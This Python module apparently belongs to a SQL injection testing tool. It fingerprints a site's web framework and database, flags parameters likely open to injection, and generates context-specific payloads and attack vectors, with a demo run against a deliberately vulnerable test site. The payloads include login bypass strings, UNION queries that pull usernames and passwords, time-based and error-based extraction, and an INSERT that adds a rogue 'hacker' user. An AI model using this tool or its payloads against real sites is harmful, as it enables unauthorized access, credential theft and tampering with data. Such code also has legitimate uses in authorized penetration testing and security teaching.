#!/usr/bin/env python3
# AI-Powered Contextual Analysis Module
# Analyzes web applications to understand context and generate specialized payloads

import os
import re
import json
import logging
import requests
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import hashlib
from datetime import datetime

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('ai_analysis')

class AIAnalysis:
    """
    AI-powered contextual analysis for SQL injection testing
    """
    def __init__(self, config):
        """Initialize AI analysis with configuration"""
        self.config = config
        self.model = config.get('model', 'local')
        self.api_key = config.get('api_key', '')
        self.max_tokens = config.get('max_tokens', 1000)
        self.data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
        self.analysis_cache_file = os.path.join(self.data_dir, 'analysis_cache.json')
        
        # Create data directory if it doesn't exist
        os.makedirs(self.data_dir, exist_ok=True)
        
        # Load analysis cache
        self.cache = self._load_cache()
        
        logger.info("AI Analysis module initialized")
        
    def _load_cache(self):
        """Load analysis cache from file or create default"""
        if os.path.exists(self.analysis_cache_file):
            try:
                with open(self.analysis_cache_file, 'r') as f:
                    data = json.load(f)
                    logger.info(f"Analysis cache loaded from {self.analysis_cache_file}")
                    return data
            except Exception as e:
                logger.error(f"Error loading analysis cache: {e}")
                
        # Create default cache
        cache = {
            "analyzed_urls": {},
            "framework_signatures": {},
            "database_signatures": {},
            "last_updated": datetime.now().isoformat()
        }
        
        # Load known framework signatures
        self._load_framework_signatures(cache)
        
        # Load known database signatures
        self._load_database_signatures(cache)
        
        # Save default cache
        try:
            with open(self.analysis_cache_file, 'w') as f:
                json.dump(cache, f, indent=2)
                logger.info(f"Default analysis cache created at {self.analysis_cache_file}")
        except Exception as e:
            logger.error(f"Error saving default analysis cache: {e}")
            
        return cache
        
    def _load_framework_signatures(self, cache):
        """Load known framework signatures"""
        cache["framework_signatures"] = {
            "wordpress": {
                "patterns": [
                    "wp-content", "wp-includes", "wp-admin",
                    '<meta name="generator" content="WordPress'
                ],
                "headers": ["x-powered-by: WordPress"],
                "cookies": ["wordpress_", "wp-settings-"],
                "db_type": "mysql"
            },
            "drupal": {
                "patterns": [
                    "sites/all", "sites/default", "drupal.js",
                    '<meta name="Generator" content="Drupal'
                ],
                "headers": ["x-drupal-"],
                "cookies": ["SESS"],
                "db_type": "mysql"
            },
            "joomla": {
                "patterns": [
                    "/components/com_", "/media/jui/",
                    '<meta name="generator" content="Joomla'
                ],
                "headers": ["x-powered-by: Joomla"],
                "cookies": ["joomla_user_state"],
                "db_type": "mysql"
            },
            "laravel": {
                "patterns": [
                    "laravel_session", "laravel.js",
                    "vendor/laravel"
                ],
                "headers": ["x-powered-by: Laravel"],
                "cookies": ["laravel_session"],
                "db_type": "mysql"
            },
            "django": {
                "patterns": [
                    "__debug__", "csrfmiddlewaretoken",
                    "django.contrib", "django.core"
                ],
                "headers": ["x-django-"],
                "cookies": ["csrftoken", "sessionid"],
                "db_type": "postgresql"
            },
            "rails": {
                "patterns": [
                    "assets/rails", "rails.js",
                    "ruby on rails"
                ],
                "headers": ["x-powered-by: Rails"],
                "cookies": ["_session_id"],
                "db_type": "postgresql"
            },
            "aspnet": {
                "patterns": [
                    ".aspx", ".asp", "asp.net",
                    "__VIEWSTATE", "__EVENTVALIDATION"
                ],
                "headers": ["x-aspnet-version", "x-powered-by: ASP.NET"],
                "cookies": ["ASP.NET_SessionId"],
                "db_type": "mssql"
            },
            "spring": {
                "patterns": [
                    "spring.js", "springframework",
                    "org.springframework"
                ],
                "headers": ["x-application-context"],
                "cookies": ["JSESSIONID"],
                "db_type": "mysql"
            },
            "codeigniter": {
                "patterns": [
                    "system/core/CodeIgniter.php",
                    "ci_session"
                ],
                "headers": ["x-powered-by: CodeIgniter"],
                "cookies": ["ci_session"],
                "db_type": "mysql"
            },
            "symfony": {
                "patterns": [
                    "symfony", "sf_symfony",
                    "Symfony\\Component"
                ],
                "headers": ["x-symfony-"],
                "cookies": ["sf_"],
                "db_type": "mysql"
            }
        }
        
    def _load_database_signatures(self, cache):
        """Load known database signatures"""
        cache["database_signatures"] = {
            "mysql": {
                "error_patterns": [
                    "MySQL Error", "mysql_fetch_array", "mysql_result",
                    "Warning: mysql_", "function.mysql",
                    "MySQL server", "mysqli_connect", "mysqli_query"
                ],
                "version_functions": [
                    "@@version", "version()"
                ],
                "comment_syntax": ["-- ", "#"],
                "string_concat": "CONCAT",
                "time_delay": "SLEEP"
            },
            "postgresql": {
                "error_patterns": [
                    "PostgreSQL Error", "pg_query", "pg_exec",
                    "Warning: pg_", "function.pg",
                    "PostgreSQL", "Npgsql"
                ],
                "version_functions": [
                    "version()"
                ],
                "comment_syntax": ["-- "],
                "string_concat": "||",
                "time_delay": "pg_sleep"
            },
            "mssql": {
                "error_patterns": [
                    "Microsoft SQL Server", "OLE DB Provider for SQL Server",
                    "Unclosed quotation mark", "SQL Server",
                    "Warning: mssql_", "function.mssql",
                    "mssql_query", "sqlsrv_", "SQL Server Native Client"
                ],
                "version_functions": [
                    "@@version"
                ],
                "comment_syntax": ["-- ", "/**/"],
                "string_concat": "+",
                "time_delay": "WAITFOR DELAY"
            },
            "oracle": {
                "error_patterns": [
                    "ORA-", "Oracle Error", "Oracle Database",
                    "Warning: oci_", "function.oci",
                    "oci_parse", "oci_execute"
                ],
                "version_functions": [
                    "SELECT banner FROM v$version"
                ],
                "comment_syntax": ["-- "],
                "string_concat": "||",
                "time_delay": "dbms_pipe.receive_message"
            },
            "sqlite": {
                "error_patterns": [
                    "SQLite Error", "sqlite_", "sqlite3_",
                    "Warning: sqlite_", "function.sqlite",
                    "SQLite3::"
                ],
                "version_functions": [
                    "sqlite_version()"
                ],
                "comment_syntax": ["-- "],
                "string_concat": "||",
                "time_delay": "randomblob"
            }
        }
        
    def _save_cache(self):
        """Save analysis cache to file"""
        try:
            with open(self.analysis_cache_file, 'w') as f:
                json.dump(self.cache, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving analysis cache: {e}")
            
    def analyze_page(self, url, html_content=None, headers=None, cookies=None):
        """Analyze a web page to identify framework, database, and application context"""
        # Check if already in cache
        url_hash = hashlib.md5(url.encode()).hexdigest()
        if url_hash in self.cache["analyzed_urls"]:
            cached = self.cache["analyzed_urls"][url_hash]
            
            # Check if cache is still valid (less than 1 day old)
            cached_time = datetime.fromisoformat(cached["timestamp"])
            now = datetime.now()
            if (now - cached_time).days < 1:
                logger.info(f"Using cached analysis for {url}")
                return cached["analysis"]
                
        # Fetch page content if not provided
        if not html_content:
            try:
                response = requests.get(url, timeout=10)
                html_content = response.text
                headers = response.headers
                cookies = response.cookies
            except Exception as e:
                logger.error(f"Error fetching page content: {e}")
                return None
                
        # Parse HTML
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
        except Exception as e:
            logger.error(f"Error parsing HTML: {e}")
            soup = None
            
        # Identify framework
        framework = self._identify_framework(url, html_content, soup, headers, cookies)
        
        # Identify database
        database = self._identify_database(html_content, framework)
        
        # Identify application context
        context = self._identify_context(url, html_content, soup)
        
        # Identify injectable parameters
        injectable_params = self._identify_injectable_parameters(url, html_content, soup)
        
        # Create analysis result
        analysis = {
            "url": url,
            "framework": framework,
            "database": database,
            "context": context,
            "injectable_parameters": injectable_params
        }
        
        # Cache the result
        self.cache["analyzed_urls"][url_hash] = {
            "timestamp": datetime.now().isoformat(),
            "analysis": analysis
        }
        self._save_cache()
        
        logger.info(f"Analysis completed for {url}: {framework['name'] if framework else 'Unknown'} framework, {database['name'] if database else 'Unknown'} database")
        return analysis
        
    def _identify_framework(self, url, html_content, soup, headers, cookies):
        """Identify the web framework used by the application"""
        scores = {}
        
        # Check each known framework
        for framework_name, signature in self.cache["framework_signatures"].items():
            score = 0
            
            # Check URL patterns
            for pattern in signature["patterns"]:
                if pattern.lower() in url.lower() or pattern.lower() in html_content.lower():
                    score += 1
                    
            # Check HTML content
            if soup:
                # Check meta tags
                for meta in soup.find_all("meta"):
                    content = meta.get("content", "").lower()
                    if framework_name in content or framework_name.title() in content:
                        score += 2
                        
                # Check script sources
                for script in soup.find_all("script"):
                    src = script.get("src", "").lower()
                    if framework_name in src:
                        score += 1
                        
            # Check HTTP headers
            if headers:
                for header_pattern in signature["headers"]:
                    for header, value in headers.items():
                        if header_pattern.split(":")[0].lower() in header.lower():
                            if len(header_pattern.split(":")) > 1:
                                if header_pattern.split(":")[1].strip().lower() in value.lower():
                                    score += 2
                            else:
                                score += 1
                                
            # Check cookies
            if cookies:
                for cookie_pattern in signature["cookies"]:
                    for cookie in cookies:
                        if cookie_pattern.lower() in cookie.lower():
                            score += 2
                            
            scores[framework_name] = score
            
        # Find the framework with the highest score
        if scores:
            max_score = max(scores.values())
            if max_score > 0:
                top_framework = max(scores.items(), key=lambda x: x[1])
                
                # Get detailed info about this framework
                framework_info = self.cache["framework_signatures"][top_framework[0]]
                
                return {
                    "name": top_framework[0],
                    "confidence": min(top_framework[1] / 10.0, 1.0),  # Normalize to 0-1
                    "db_type": framework_info["db_type"],
                    "patterns_matched": top_framework[1]
                }
                
        # If no framework identified with confidence
        return None
        
    def _identify_database(self, html_content, framework):
        """Identify the database used by the application"""
        if framework and "db_type" in framework:
            # Use the framework's default database type
            db_type = framework["db_type"]
            db_signature = self.cache["database_signatures"].get(db_type)
            
            if db_signature:
                return {
                    "name": db_type,
                    "confidence": 0.7,  # Based on framework detection
                    "string_concat": db_signature["string_concat"],
                    "comment_syntax": db_signature["comment_syntax"],
                    "time_delay": db_signature["time_delay"],
                    "version_functions": db_signature["version_functions"]
                }
                
        # Try to identify from error patterns in the HTML
        scores = {}
        
        for db_name, signature in self.cache["database_signatures"].items():
            score = 0
            
            for pattern in signature["error_patterns"]:
                if pattern.lower() in html_content.lower():
                    score += 1
                    
            scores[db_name] = score
            
        if scores:
            max_score = max(scores.values())
            if max_score > 0:
                top_db = max(scores.items(), key=lambda x: x[1])
                db_signature = self.cache["database_signatures"][top_db[0]]
                
                return {
                    "name": top_db[0],
                    "confidence": min(top_db[1] / 5.0, 1.0),  # Normalize to 0-1
                    "string_concat": db_signature["string_concat"],
                    "comment_syntax": db_signature["comment_syntax"],
                    "time_delay": db_signature["time_delay"],
                    "version_functions": db_signature["version_functions"]
                }
                
        # If no database identified, default to MySQL (most common)
        return {
            "name": "mysql",
            "confidence": 0.4,  # Low confidence default
            "string_concat": "CONCAT",
            "comment_syntax": ["-- ", "#"],
            "time_delay": "SLEEP",
            "version_functions": ["@@version", "version()"]
        }
        
    def _identify_context(self, url, html_content, soup):
        """Identify the application context (login, search, etc.)"""
        context = {
            "type": "unknown",
            "confidence": 0.0,
            "relevant_features": []
        }
        
        # Parse URL path
        path = urlparse(url).path.lower()
        
        # Check for common contexts in the URL path
        context_patterns = {
            "login": ["login", "signin", "auth", "account", "user"],
            "search": ["search", "find", "query", "lookup", "browse"],
            "product": ["product", "item", "detail", "shop", "store"],
            "admin": ["admin", "dashboard", "manage", "control", "panel"],
            "profile": ["profile", "account", "user", "member", "settings"],
            "checkout": ["checkout", "cart", "basket", "payment", "order"],
            "blog": ["blog", "post", "article", "news", "comment"]
        }
        
        # Check URL path
        for context_type, patterns in context_patterns.items():
            for pattern in patterns:
                if pattern in path:
                    context["type"] = context_type
                    context["confidence"] = 0.7
                    context["relevant_features"].append(f"URL contains '{pattern}'")
                    break
                    
        # If no context identified from URL, check HTML content
        if context["type"] == "unknown" and soup:
            # Check form actions
            for form in soup.find_all("form"):
                action = form.get("action", "").lower()
                for context_type, patterns in context_patterns.items():
                    for pattern in patterns:
                        if pattern in action:
                            context["type"] = context_type
                            context["confidence"] = 0.6
                            context["relevant_features"].append(f"Form action contains '{pattern}'")
                            break
                            
            # Check input fields
            if context["type"] == "unknown":
                input_types = [i.get("type", "").lower() for i in soup.find_all("input")]
                input_names = [i.get("name", "").lower() for i in soup.find_all("input")]
                
                # Login context
                if ("password" in input_types or 
                    any(name in ["username", "user", "email", "login"] for name in input_names)):
                    context["type"] = "login"
                    context["confidence"] = 0.8
                    context["relevant_features"].append("Found login input fields")
                    
                # Search context
                elif "search" in input_names or "q" in input_names:
                    context["type"] = "search"
                    context["confidence"] = 0.8
                    context["relevant_features"].append("Found search input fields")
                    
        return context
        
    def _identify_injectable_parameters(self, url, html_content, soup):
        """Identify potentially injectable parameters"""
        injectable_params = []
        
        # Extract parameters from URL
        parsed_url = urlparse(url)
        query_params = parsed_url.query.split("&")
        
        for param in query_params:
            if "=" in param:
                name, value = param.split("=", 1)
                
                # Check if parameter name suggests database interaction
                db_related = any(p in name.lower() for p in [
                    "id", "user", "name", "cat", "category", "product", "item", 
                    "page", "search", "query", "filter", "sort", "order", "number",
                    "uid", "pid", "record"
                ])
                
                injectable_params.append({
                    "name": name,
                    "value": value,
                    "location": "url",
                    "likely_injectable": db_related,
                    "context": "query"
                })
                
        # Extract parameters from forms
        if soup:
            for i, form in enumerate(soup.find_all("form")):
                form_method = form.get("method", "get").lower()
                form_action = form.get("action", "")
                
                for input_field in form.find_all(["input", "select", "textarea"]):
                    name = input_field.get("name")
                    if name:
                        field_type = input_field.get("type", "text").lower()
                        
                        # Check if parameter name suggests database interaction
                        db_related = any(p in name.lower() for p in [
                            "id", "user", "name", "cat", "category", "product", "item", 
                            "page", "search", "query", "filter", "sort", "order", "number",
                            "uid", "pid", "record"
                        ])
                        
                        # Skip password fields
                        if field_type == "password":
                            db_related = False
                            
                        injectable_params.append({
                            "name": name,
                            "form_id": i,
                            "form_method": form_method,
                            "form_action": form_action,
                            "field_type": field_type,
                            "location": "form",
                            "likely_injectable": db_related,
                            "context": "form"
                        })
                        
        return injectable_params
        
    def generate_contextual_payloads(self, url, context=None, db_type=None, parameter=None):
        """Generate context-specific SQL injection payloads"""
        # If context not provided, analyze the page
        if not context or not db_type:
            analysis = self.analyze_page(url)
            if analysis:
                context = context or analysis["context"]["type"]
                db_type = db_type or (analysis["database"]["name"] if analysis["database"] else "mysql")
                
        # Get database specific details
        db_info = next((s for name, s in self.cache["database_signatures"].items() 
                      if name.lower() == db_type.lower()), None)
                      
        if not db_info:
            db_info = self.cache["database_signatures"]["mysql"]  # Default to MySQL
            
        # Base payloads by context
        context_payloads = {
            "login": [
                "' OR 1=1 --",
                "' OR '1'='1",
                "admin' --",
                "admin'/**/OR/**/1=1#",
                "' UNION SELECT 1,username,password FROM users --"
            ],
            "search": [
                "' OR 1=1 --",
                "' UNION SELECT 1,2,3 --",
                "%) UNION SELECT 1,2,3 --",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --"
            ],
            "product": [
                "1 OR 1=1",
                "1' UNION SELECT null,table_name,null FROM information_schema.tables --",
                "-1' UNION SELECT 1,@@version,3 --",
                "1' AND SLEEP(5) --"
            ],
            "admin": [
                "1' AND 1=1 --",
                "admin'--",
                "' UNION SELECT username,password,3 FROM users --",
                "1'; INSERT INTO users VALUES ('hacker','password123') --"
            ],
            "unknown": [
                "' OR 1=1 --",
                "1' OR '1'='1",
                "' UNION SELECT 1,2,3 --",
                "' AND SLEEP(5) --"
            ]
        }
        
        # Get base payloads for the context
        base_payloads = context_payloads.get(context, context_payloads["unknown"])
        
        # Adapt to database type
        db_adapted_payloads = []
        
        for payload in base_payloads:
            # Adapt comment syntax
            if "--" in payload and db_info["comment_syntax"]:
                for comment in db_info["comment_syntax"]:
                    db_adapted_payloads.append(payload.replace("--", comment))
            else:
                db_adapted_payloads.append(payload)
                
            # Adapt UNION queries
            if "UNION SELECT" in payload:
                # For Oracle, all SELECT statements must have FROM clause
                if db_type.lower() == "oracle":
                    db_adapted_payloads.append(payload.replace("UNION SELECT", "UNION SELECT * FROM DUAL"))
                    
            # Adapt time-based payloads
            if "SLEEP" in payload and db_info["time_delay"] != "SLEEP":
                if db_type.lower() == "postgresql":
                    db_adapted_payloads.append(payload.replace("SLEEP(5)", "pg_sleep(5)"))
                elif db_type.lower() == "mssql":
                    db_adapted_payloads.append(payload.replace("SLEEP(5)", "WAITFOR DELAY '0:0:5'"))
                elif db_type.lower() == "oracle":
                    db_adapted_payloads.append(payload.replace("SLEEP(5)", "dbms_pipe.receive_message('a',5)"))
                    
        # Parameter-specific adaptations
        if parameter:
            # For numeric parameters
            if parameter.get("likely_injectable", False) and "id" in parameter.get("name", "").lower():
                numeric_payloads = [
                    "1 OR 1=1",
                    "-1 UNION SELECT 1,2,3",
                    "1) OR (1=1",
                    "1)) OR ((1=1"
                ]
                db_adapted_payloads.extend(numeric_payloads)
                
        # Remove duplicates
        db_adapted_payloads = list(set(db_adapted_payloads))
        
        return db_adapted_payloads
        
    def suggest_attack_vectors(self, url):
        """Suggest attack vectors based on application analysis"""
        # Analyze the page
        analysis = self.analyze_page(url)
        
        if not analysis:
            return []
            
        attack_vectors = []
        
        # Framework-specific vectors
        if analysis["framework"]:
            framework = analysis["framework"]["name"].lower()
            
            if framework == "wordpress":
                attack_vectors.append({
                    "name": "WordPress User Enumeration",
                    "description": "WordPress allows user enumeration via ?author=ID parameter",
                    "test_url": f"{urlparse(url).scheme}://{urlparse(url).netloc}/?author=1",
                    "risk_level": "medium"
                })
                
            elif framework == "drupal":
                attack_vectors.append({
                    "name": "Drupal SQL Injection",
                    "description": "Test for SQL injection in Drupal's search functionality",
                    "test_url": f"{urlparse(url).scheme}://{urlparse(url).netloc}/search/node/%' AND 1=1 --",
                    "risk_level": "high"
                })
                
        # Context-specific vectors
        if analysis["context"]["type"] == "login":
            attack_vectors.append({
                "name": "Authentication Bypass",
                "description": "Attempt to bypass login using SQL injection",
                "payloads": ["' OR 1=1 --", "admin' --", "' OR '1'='1"],
                "risk_level": "critical"
            })
            
        elif analysis["context"]["type"] == "search":
            attack_vectors.append({
                "name": "Search Form Injection",
                "description": "SQL injection via search parameters",
                "payloads": ["' UNION SELECT 1,2,3 --", "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --"],
                "risk_level": "high"
            })
            
        # Parameter-based vectors
        for param in analysis["injectable_parameters"]:
            if param.get("likely_injectable", False):
                if param["location"] == "url":
                    param_value = param.get("value", "1")
                    test_url = url.replace(f"{param['name']}={param_value}", f"{param['name']}=1' OR '1'='1")
                    
                    attack_vectors.append({
                        "name": f"Parameter Injection: {param['name']}",
                        "description": f"SQL injection via URL parameter {param['name']}",
                        "test_url": test_url,
                        "payloads": self.generate_contextual_payloads(url, analysis["context"]["type"], 
                                                               analysis["database"]["name"] if analysis["database"] else "mysql", 
                                                               param),
                        "risk_level": "high"
                    })
                    
        return attack_vectors

if __name__ == "__main__":
    # Simple test/demo
    config = {
        'model': 'local',
        'api_key': '',
        'max_tokens': 1000
    }
    
    ai = AIAnalysis(config)
    
    # Test URL analysis
    test_url = "http://testphp.vulnweb.com/search.php?test=query"
    print(f"Analyzing {test_url}...")
    analysis = ai.analyze_page(test_url)
    
    if analysis:
        print(f"Framework: {analysis['framework']['name'] if analysis['framework'] else 'Unknown'}")
        print(f"Database: {analysis['database']['name'] if analysis['database'] else 'Unknown'}")
        print(f"Context: {analysis['context']['type']}")
        print(f"Injectable parameters: {len(analysis['injectable_parameters'])}")
        
        # Generate contextual payloads
        payloads = ai.generate_contextual_payloads(test_url)
        print("\nGenerated payloads:")
        for payload in payloads[:5]:  # Show first 5
            print(f"- {payload}")
            
        # Suggest attack vectors
        vectors = ai.suggest_attack_vectors(test_url)
        print("\nSuggested attack vectors:")
        for vector in vectors:
            print(f"- {vector['name']} ({vector['risk_level']})")
            print(f"  {vector['description']}")
